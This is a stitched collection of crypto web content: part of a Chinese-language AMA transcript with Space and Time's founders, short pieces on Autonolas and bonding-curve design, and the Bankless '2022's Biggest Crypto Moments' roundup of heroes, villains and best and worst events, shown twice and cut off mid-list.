成为一个能够成功的独特项目？\nNate：我喜欢这个问题，Spencer，你想回复吗？\nSpencer：简短的回答是，我真的认为我们的团队在这里要承担很多责任。我的意思是，我们现在拥有业内最勤奋、最有才华的团队之一。显然，我们正在通过为智能合约提供防篡改分析来连接链上和链下数据，从而在该领域做一些创新，这是我们的主要工作。但是我们拥有最勤奋的团队之一，一些这个领域最有才华的密码学家，一些这个领域最有才华的数据库工程师，我们正在为这个项目夜以继日地工作，这里的每个人都非常热情我们有一个了不起的社区，你们，这让我们曝光了。我认为你们是我们这一整年努力的证明，从会议到后端编码的一切。所以不确定我是否在那里从技术上回答了 T，但也许我会把它传递给你，让你快速总结一下这个问题，Nate。\nNate：当然，我不同意。我认为我们的团队是非凡的。你看看数据库、密码学、数据仓库方面的专家，我们有非常好的营销，我们也有一个非常好的进入市场的团队。该团队专注于交付项目，并且全天候工作。我要补充的另一件事是，我认为从商业角度来看，Web3 将会获胜。如果你正在构建一个新的应用程序，我坚信你将在 Web3 中构建新的应用程序作为一项业务。而且我认为 Web3 社区将继续高速增长，新的应用程序将主导市场。那是我的信念。这就是我们构建 Web3 原生内容的原因。因为我们可以接管所有 Web2 业务，并进行艰苦的工作，将其推倒重来，并将其转移到 Web3 结构中。但我认为在一段时间内，你会看到想要建立业务的人，想要参与不同项目的人，将想要参与 Web3 构建。经济学是不同的，经济学关注的是社区，我认为在一段时间内，Web3 业务结构将被证明是赢家。当我们交付我们正在构建的东西并在 Web3 结构中交付以供采用时，我认为这会创造出真正全面发展市场的能力的浪潮。因此，我们对这个机会感到非常兴奋，因为正在建立的市场实际上是为世界建立的下一代业务，我们将坐在其中。\n如果团队不专注于交付，它就不会发生。这将成为使我们能够成功的惯性和起源。但如果你说不出来，我非常、非常看好这个社区，因为我们都在这里，因为我们认为有更好的方式来相互交流。我们认为我们的数据有更好的使用方式。我们认为，有一种更好的方式来构建业务来为多数人而不是少数人提供动力。因此，我认为 Web3 的整体商业原则将在未来几年和几十年内继续加速并继续在市场上取胜。\n总结\nSpencer：太好了，伙计们，我想今天的 AMA 就到此为止了。大家，随时联系我们吧！我们希望在这里沟通零障碍，我们希望你们能与我们交谈。请在 Discord 上联系 Mike 和我本人。Mike在沟通和确保听到您所有的声音方面非常出色。我们想让 Discord AMA 变得更加常规。我们最近经常出差，所以很辛苦，但我们肯定会让这些变得更规律。我只想再次感谢大家的支持，我怎么强调我们还早呢。我们在这里制作还不到一整年，我们对未来有很多期待。所以我会用它来结束它。Mike，非常感谢你穿上它，感谢你组织一切。好的，伙计们，我们会在下一个节目中找到你。\nNate：谢谢大家！\n[会议结束]\nSpace and Time链接：\n网站：

Their <a href=\"https://www.autonolas.network/\">Autonolas</a> application uses the Open Autonomy framework to manage multi-agent services off-chain, extending smart contract functionality and allowing complex operations to be executed in a decentralized, trust-minimized, and transparent way. Autonomous sources can pull data from a variety of sources, such as AWS storage buckets and cryp-native data sources like IPFS, Ceramic, or The Graph. Agents that run services must agree on servicer terms similar to service level agreements (SLAs) and achieve consensus using the tendermint library, which is the same consensus method used by the Cosmos ecosystem.

The MP state is managed by state parameters under the direction of a controller smart contract. Since the smart contract is the controller, the MP is managed entirely on-chain.</p>\n<p>One complex feature that the MP controller V1 provides is the ability to add or remove tokens from an MP without providing initial seed capital. This mechanism relies on arbitrageurs to fill or drain the pool&#39;s token balance and restore the MP to its desired composition. While this mechanism usually works, there are some unforeseen negative consequences around token joins and exits. A potential fix has been identified, but it is not yet clear whether it offers a permanent solution to the problem.</p>\n<p>When initial token liquidity is being added or removed from an MP, the MP controller has to consider two distinct states. The first state occurs when a token&#39;s liquidity weight is going from 0% to the minimum 1% weight. The current mechanism enables trading by using the MP controller to set a virtual balance to get around the initial 0 liquidity weight. A swap fee is then used to incentivize further rebalancing and smooth arbitrage opportunities as the new token is added or removed. The second state occurs when the token is going from the 1% minimum weight to the desired weight. Arbitrageurs are incentivized by a gradual weight shift until the desired weight is reached.</p>\n<p>The flexibility of MPs allows for multiple techniques for adding and removing tokens. For example, token replacement could involve trading all of Token A for Token B. Another technique, which involves trust and custody assumptions for the manager, is for the MPC to add Token A, then provide the minimum Token A liquidity denominated in Token A as seed liquidity.</p>\n<h1 id=\"canonical-bonding-curves\">Canonical Bonding Curves</h1>\n<p>A canonical bonding curve is a trading function that determines the swap rate between ratios of two different assets, setting the price between the ratio of the assets being traded. The concept was popularized initially <a href=\"https://drive.google.com/file/d/0B3HPNP-GDn7aLXFWOFpTZEgyaEk/view?resourcekey=0-4Ig-YpDMIC0W2rLmTtWeDA\">by Bancor</a>. Bancor&#39;s bonding curve uses a constant reserve ratio (CRR) to calculate the price of a bonding curve swap. A higher CRR means there is more supply in liquidity to absorb volatility, while a lower CRR means there is less liquidity and less in circulation, which can be considered as a &quot;credit&quot; compared to the original amount. However, this bonding curve design is <a href=\"https://arxiv.org/pdf/2203.10644.pdf\">susceptible to sandwich attacks and encourages speculation</a>.</p>\n<p>An <a href=\"https://arxiv.org/pdf/2203.10644.pdf\">allocation curve</a> design is a more general bonding curve that improves on the canonical bonding curve sandwich attack flaw.

In some ways, the past year felt like a wilder ride than the raging bull market of 2021!&nbsp;</p><p>Yet beyond all the chaos and drama we faced in 2022, we also undoubtedly made promising advances in all directions.

But thankfully, Ryan and David decided to do it for us with their &#8220;2022's Biggest Crypto Moments&#8221; livestream.</p><p>In addition to the big moments, they touched on a few bonus categories, such as crowning &#8220;gm&#8221; the meme of the year and awarding Gary Gensler the prestigious honor of &#8220;best supporting actor in a comedy&#8221; due to his laughable attempts at regulation, including his failure to identify and prevent the massive fraud at FTX, in 2022.</p><p>As with all Bankless content, the stream is a must-watch.&nbsp;</p><div id=\"youtube2-z9-73724_lg\" class=\"youtube-wrap\" data-attrs=\"{&quot;videoId&quot;:&quot;z9-73724_lg&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}\"><div class=\"youtube-inner\"><iframe src=\"https://www.youtube-nocookie.com/embed/z9-73724_lg?rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0\" frameborder=\"0\" loading=\"lazy\" gesture=\"media\" allow=\"autoplay; fullscreen\" allowautoplay=\"true\" allowfullscreen=\"true\" width=\"728\" height=\"409\"></iframe></div></div><p>But for the old souls like myself who still prefer the written word, here&#8217;s the tl;dr of 2022&#8217;s biggest crypto moments. &#11015;&#65039;</p><div><hr></div><h2><strong>&#129464;&#8205;&#9794;&#65039; Top 5 Heroes</strong></h2><h4><strong>5. Michael Saylor</strong></h4><p>Everyone's favorite Bitcoin permabull takes the fifth spot on the list. Saylor has taken a $3.4B loss on the chin in 2022 as BTC has fallen more than 63% YTD. It&#8217;s fair to question Saylor&#8217;s strategy in light of his performance, but his conviction is admirable. Saylor has continued to buy throughout the downturn while shunning every other asset in existence. There is no second-best TradFi ape.</p><h4><strong>4. Anthony Sassano</strong></h4><p>While not as high-profile as Saylor, Anthony Sassano is certainly deserving of inclusion on this list. Sassano, runs <em>The Daily Gwei</em> newsletter and YouTube channel, where he provides free, educational content on all things Ethereum. Anthony is as consistent as the block production on the chain he covers, shipping highly informative content day in and day out.</p><h4><strong>3. Cobie</strong></h4><p>Cobie is known for being one of the most legendary traders in crypto, but in 2022 has shown himself to have quite the charitable side. Cobie made waves this year through his donations to Twitch streamers and for providing $100K in funding for the defense of atozy against a frivolous BitBoy lawsuit. In a true demonstration of his generosity, Cobie even let atozy keep the money after BitBoy dropped the suit.</p><h4><strong>2. ZachXBT</strong></h4><p>ZachXBT has done god's work in 2022 as one of crypto&#8217;s best self-regulators. The anonymous on-chain sleuth has exposed a plethora of scams, rugs, and unethical business practices across the industry. ZachXBT&#8217;s actions are incredibly courageous, as he is taking considerable personal risk in publishing his expos&#233;s and doing his part to make crypto a safer and more ethical space.</p><h4><strong>1. The Merge Devs</strong></h4><p>The Merge devs take the top spot on our heroes list. The devs, which include, <a href=\"https://twitter.com/icebearhww/status/1431970802040127498?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1431970802040127498%7Ctwgr%5Ec45919fbe96a7cee949bbddb7e9f498ce205a4c4%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.coindesk.com%2Fconsensus-magazine%2F2022%2F12%2F05%2Fvitalik-buterin-most-influential-2022%2F\">Hsiao-Wei Wang</a>, <a href=\"https://twitter.com/parithosh_j\">Parithosh Jayanthi</a>, <a href=\"https://twitter.com/vdwijden\">Marius Van Der Wijden</a>, <a href=\"https://twitter.com/benjaminion_xyz\">Ben Edgington</a>, <a href=\"https://twitter.com/TimBeiko?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor\">Tim Beiko</a> and <a href=\"https://img.decrypt.co/insecure/rs:fit:1536:0:0:0/plain/https://cdn.decrypt.co/wp-content/uploads/2020/07/danny-ryan-ethereum-gID_7.png@webp\">Danny Ryan</a> managed to pull off one of the most monumental technical achievements in crypto history in transitioning Ethereum from Proof-Of-Work to Proof-Of-Stake. What makes this accomplishment even more impressive is that the merge went off without a hitch despite the complexity of the task, perpetual distractions with the insanity of 2022, and the high-stakes of handling a $200B+ network.</p><div><hr></div><h2><strong>&#129465;&#8205;&#9794;&#65039; Top 5 Villains</strong></h2><h4><strong>5. Richard Heart</strong></h4><p>Richard Heart takes the fifth spot on our list. Heart not only is the man behind the highly controversial token HEX, but has also drawn the ire of many through his ostentatious and obnoxious displays of wealth.</p><h4><strong>4. Alex Mashinsky</strong></h4><p>The Celsius CEO ran his business into the ground due to incredibly poor risk management and excessive risk-taking. That wouldn't necessarily land him on this list, but Mashinsky and Celsius executives withdrew millions in funds in the weeks leading up to the platform pausing withdrawals and declaring bankruptcy. Mashinsky famously wore a shirt which said &#8220;bankers aren&#8217;t your friend.&#8221; That may be true, but Mashinsky certainly isn&#8217;t one either.</p><h4><strong>3. Su Zhu and Kyle Davies</strong></h4><p>As we&#8217;ve previously discussed, 3AC&#8217;s collapse wreaked havoc on the industry. So it's fitting that its outspoken co-founders and super-cycle proponents Su Zhu and Kyle Davies make our list, especially after allegations that they double pledged collateral and misrepresented their financial position to lenders. Su Zhu infamously tweeted that Ethereum abandoned its users&#8230;but it appears that 3AC abandoned its own creditors and morals in their thirst for leverage.</p><h4><strong>2. Do Kwon</strong></h4><p>Do Kwon takes the second spot on our list. The algorithmic stablecoin founder compounded poor protocol design and reckless risk-management decisions like choosing to back UST with Bitcoin. Kwon didn't help matters through his tweets, infamously stating that by his hand &#8220;DAI would DAI&#8221; while directing an army of Lunatics towards any who dared to criticize him or his behavior.&nbsp;</p><h4><strong>1. Sam Bankman-Fried</strong></h4><p>This should come as a surprise to no one, but SBF takes the cake for 2022&#8217;s worst villain. He stole $8B dollars and committed one of the worst financial crimes in human history. The recently arrested SBF has wreaked an incalculable amount of damage on the space. He is likely going to prison for a long, long time. Good riddance.</p><div><hr></div><h2><strong>&#129326; Top 5 Worst Moments</strong></h2><h4><strong>5. Tornado Cash Sanctions</strong>&nbsp;</h4><p>There&#8217;s a reason why many in crypto feel the justice system is anything but just towards the industry. While many of crypto&#8217;s most egregious scammers and grifters walk free today, Tornado Cash developer Alexey Pertsev was arrested in July following OFAC sanctions on the protocol. Imprisoned for simply creating code to protect privacy, a human right, Alexey&#8217;s arrest is one the most unjust events of 2022.</p><h4><strong>4. The Collapse of Terra</strong></h4><p>The collapse of Terra was one of the largest capital destruction events in human history, with LUNA and UST losing more than ~$60B in combined value in a hyperinflationary death spiral. The algorithmic stablecoin&#8217;s implosion is terrible enough in its own right, but is even worse with hindsight as it catalyzed the credit crisis and ensuing contagion that wreaked havoc across CeFi.&nbsp;&nbsp;</p><h4><strong>3. The Collapse of 3AC</strong></h4><p>Once a titan of industry, the fall of Three Arrows Capital had a devastating impact on the space. The hedge fund took out numerous undercollateralized loans in order to buy assets and employ unprofitable strategies like the GBTC discount trade. The 3AC meltdown led to a massive sell-off as their positions were liquidated, wiping out more than $1T in crypto market-cap and left a trail of CeFi bodies like Celsisus, BlockFi, and Voyager in its wake.</p><h4><strong>2. The Ronin and Wormhole Cross-Chain Hacks</strong></h4><p>Cross-chain bridges are insecure! It&#8217;s a lesson that we have learned time and time again as billions have been stolen in bridge hacks. Two of the largest casualties in 2022 were Wormhole, a cross-chain messaging protocol, and the bridge for Ronin, an L1 that hosts the P2E game Axie Infinity. More than $1B was stolen from these two protocols, with the Ronin hack being particularly egregious as it occurred due to improper private key management and helped spur the OFAC sanctions against Tornado Cash.</p><h4><strong>1. The Collapse of FTX</strong></h4><p>Could it be anything else?</p><p>The FTX collapse revealed a massive fraud, as CEO Sam Bankman-Fried used customer deposits as his own personal slush fund to purchase real estate, invest in venture deals, make political donations and issue loans to his hedge-fund, Alameda Research. FTX will represent a stain on the industry over the coming months and years.</p><p>But if there&#8217;s any silver lining from this situation, it&#8217;s that it has once again reminded us of the importance of decentralization and self-custody. NOT YOUR KEYS, NOT YOUR COINS.</p><div><hr></div><h2><strong>&#127942; Top 5 Best Moments</strong></h2><h4><strong>5. Crypto Supports Ukraine</strong></h4><p>Crypto demonstrated it can be a highly effective tool for facilitating political donations in a fast, efficient, and permissionless manner. Tens of millions were donated to support the defense of Ukraine, including a $6.5M sale of an NFT of the nation&#8217;s flag.&nbsp;</p><h4><strong>4. L2s Flip L1s in Transaction Activity</strong></h4><p>We may have been a year late, but we finally had an L2 summer (sort of). According to L2 Beat, in October the average transaction per second (TPS) on Layer 2&#8217;s surpassed that of Layer 1. Although we still have a ways to go when it comes to having enough blockspace to onboarding millions and billions, slowly but surely Etheruem is beginning to scale.</p><h4><strong>3. Web2 Adopts NFTs</strong></h4><p>A host of different Web2 businesses began to adopt NFTs in 2022, such as Reddit, Instagram, TikTok, and Twitter. Your normie friends may still hate them, but it's undeniable that the stage is being set for NFTs to be integrated into everyday life.</p><h4><strong>2.

As we inch closer to 2023, we’re feeling nostalgic and reflecting on what went right (and very, very wrong) in 2022.\nThis week, Ryan and David delivered some livestreamed perspectives on the biggest moments of the year, which we’ve captured for you below. They divided up their highlights into four categories:\n\nThe Biggest Heroes of 2022\n\nThe Biggest Villains of 2022\n\nThe Worst Moments of 2022\n\nThe Best Moments of 2022 \n\nRead along and then check out the recording to see who made an impact this year — for better or worse.\n- Bankless team\nP.S.

Mint goes live at 12pm EST 🫡\n\n\n2022's Biggest Moments\n\nBankless Writer: Ben Giove, Bankless Analyst\n\n\n\n\n\n\n\n\nGraphic by Logan Craig\n2022 has certainly been one of the most… eventful… years in crypto’s history.\nThe industry has dramatically changed over the course of the year as prices tumbled and the excesses of 2021 washed away.\nThere’s so much to cover when trying to take inventory of 2022. But thankfully, Ryan and David decided to do it for us with their “2022's Biggest Crypto Moments” livestream.\nIn addition to the big moments, they touched on a few bonus categories, such as crowning “gm” the meme of the year and awarding Gary Gensler the prestigious honor of “best supporting actor in a comedy” due to his laughable attempts at regulation, including his failure to identify and prevent the massive fraud at FTX, in 2022.\nAs with all Bankless content, the stream is a must-watch. \n\n\n\nBut for the old souls like myself who still prefer the written word, here’s the tl;dr of 2022’s biggest crypto moments. ⬇️\n\n\n🦸‍♂️ Top 5 Heroes\n5. Michael Saylor\nEveryone's favorite Bitcoin permabull takes the fifth spot on the list. Saylor has taken a $3.4B loss on the chin in 2022 as BTC has fallen more than 63% YTD. It’s fair to question Saylor’s strategy in light of his performance, but his conviction is admirable. Saylor has continued to buy throughout the downturn while shunning every other asset in existence. There is no second-best TradFi ape.\n4. Anthony Sassano\nWhile not as high-profile as Saylor, Anthony Sassano is certainly deserving of inclusion on this list. Sassano, runs The Daily Gwei newsletter and YouTube channel, where he provides free, educational content on all things Ethereum. Anthony is as consistent as the block production on the chain he covers, shipping highly informative content day in and day out.\n3. Cobie\nCobie is known for being one of the most legendary traders in crypto, but in 2022 has shown himself to have quite the charitable side. Cobie made waves this year through his donations to Twitch streamers and for providing $100K in funding for the defense of atozy against a frivolous BitBoy lawsuit. In a true demonstration of his generosity, Cobie even let atozy keep the money after BitBoy dropped the suit.\n2. ZachXBT\nZachXBT has done god's work in 2022 as one of crypto’s best self-regulators. The anonymous on-chain sleuth has exposed a plethora of scams, rugs, and unethical business practices across the industry. ZachXBT’s actions are incredibly courageous, as he is taking considerable personal risk in publishing his exposés and doing his part to make crypto a safer and more ethical space.\n1. The Merge Devs\nThe Merge devs take the top spot on our heroes list. The devs, which include, Hsiao-Wei Wang, Parithosh Jayanthi, Marius Van Der Wijden, Ben Edgington, Tim Beiko and Danny Ryan managed to pull off one of the most monumental technical achievements in crypto history in transitioning Ethereum from Proof-Of-Work to Proof-Of-Stake. What makes this accomplishment even more impressive is that the merge went off without a hitch despite the complexity of the task, perpetual distractions with the insanity of 2022, and the high-stakes of handling a $200B+ network.\n\n\n🦹‍♂️ Top 5 Villains\n5. Richard Heart\nRichard Heart takes the fifth spot on our list. Heart not only is the man behind the highly controversial token HEX, but has also drawn the ire of many through his ostentatious and obnoxious displays of wealth.\n4. Alex Mashinsky\nThe Celsius CEO ran his business into the ground due to incredibly poor risk management and excessive risk-taking. That wouldn't necessarily land him on this list, but Mashinsky and Celsius executives withdrew millions in funds in the weeks leading up to the platform pausing withdrawals and declaring bankruptcy. Mashinsky famously wore a shirt which said “bankers aren’t your friend.” That may be true, but Mashinsky certainly isn’t one either.\n3. Su Zhu and Kyle Davies\nAs we’ve previously discussed, 3AC’s collapse wreaked havoc on the industry. So it's fitting that its outspoken co-founders and super-cycle proponents Su Zhu and Kyle Davies make our list, especially after allegations that they double pledged collateral and misrepresented their financial position to lenders. Su Zhu infamously tweeted that Ethereum abandoned its users…but it appears that 3AC abandoned its own creditors and morals in their thirst for leverage.\n2. Do Kwon\nDo Kwon takes the second spot on our list. The algorithmic stablecoin founder compounded poor protocol design and reckless risk-management decisions like choosing to back UST with Bitcoin. Kwon didn't help matters through his tweets, infamously stating that by his hand “DAI would DAI” while directing an army of Lunatics towards any who dared to criticize him or his behavior. \n1. Sam Bankman-Fried\nThis should come as a surprise to no one, but SBF takes the cake for 2022’s worst villain. He stole $8B dollars and committed one of the worst financial crimes in human history. The recently arrested SBF has wreaked an incalculable amount of damage on the space. He is likely going to prison for a long, long time. Good riddance.\n\n\n🤮 Top 5 Worst Moments\n5. Tornado Cash Sanctions \nThere’s a reason why many in crypto feel the justice system is anything but just towards the industry. While many of crypto’s most egregious scammers and grifters walk free today, Tornado Cash developer Alexey Pertsev was arrested in July following OFAC sanctions on the protocol. Imprisoned for simply creating code to protect privacy, a human right, Alexey’s arrest is one the most unjust events of 2022.\n4. The Collapse of Terra\nThe collapse of Terra was one of the largest capital destruction events in human history, with LUNA and UST losing more than ~$60B in combined value in a hyperinflationary death spiral. The algorithmic stablecoin’s implosion is terrible enough in its own right, but is even worse with hindsight as it catalyzed the credit crisis and ensuing contagion that wreaked havoc across CeFi.  \n3. The Collapse of 3AC\nOnce a titan of industry, the fall of Three Arrows Capital had a devastating impact on the space. The hedge fund took out numerous undercollateralized loans in order to buy assets and employ unprofitable strategies like the GBTC discount trade. The 3AC meltdown led to a massive sell-off as their positions were liquidated, wiping out more than $1T in crypto market-cap and left a trail of CeFi bodies like Celsisus, BlockFi, and Voyager in its wake.\n2. The Ronin and Wormhole Cross-Chain Hacks\nCross-chain bridges are insecure! It’s a lesson that we have learned time and time again as billions have been stolen in bridge hacks. Two of the largest casualties in 2022 were Wormhole, a cross-chain messaging protocol, and the bridge for Ronin, an L1 that hosts the P2E game Axie Infinity. More than $1B was stolen from these two protocols, with the Ronin hack being particularly egregious as it occurred due to improper private key management and helped spur the OFAC sanctions against Tornado Cash.\n1. The Collapse of FTX\nCould it be anything else?\nThe FTX collapse revealed a massive fraud, as CEO Sam Bankman-Fried used customer deposits as his own personal slush fund to purchase real estate, invest in venture deals, make political donations and issue loans to his hedge-fund, Alameda Research. FTX will represent a stain on the industry over the coming months and years.\nBut if there’s any silver lining from this situation, it’s that it has once again reminded us of the importance of decentralization and self-custody. NOT YOUR KEYS, NOT YOUR COINS.\n\n\n🏆 Top 5 Best Moments\n5. Crypto Supports Ukraine\nCrypto demonstrated it can be a highly effective tool for facilitating political donations in a fast, efficient, and permissionless manner. Tens of millions were donated to support the defense of Ukraine, including a $6.5M sale of an NFT of the nation’s flag. \n4. L2s Flip L1s in Transaction Activity\nWe may have been a year late, but we finally had an L2 summer (sort of). According to L2 Beat, in October the average transaction per second (TPS) on Layer 2’s surpassed that of Layer 1. Although we still have a ways to go when it comes to having enough blockspace to onboarding millions and billions, slowly but surely Etheruem is beginning to scale.\n3. Web2 Adopts NFTs\nA host of different Web2 businesses began to adopt NFTs in 2022, such as Reddit, Instagram, TikTok, and Twitter. Your normie friends may still hate them, but it's undeniable that the stage is being set for NFTs to be integrated into everyday life.\n2. The Merge\nAs previously mentioned the merge was a monumental technical achievement. Its impact on Ethereum cannot be overstated as it reduced energy consumption and ETH inflation by orders of magnitude while paving the way for future scalability upgrades. Watching the flawless execution of the merge live was surreal, and is certainly a moment that the community will never forget.\n1.
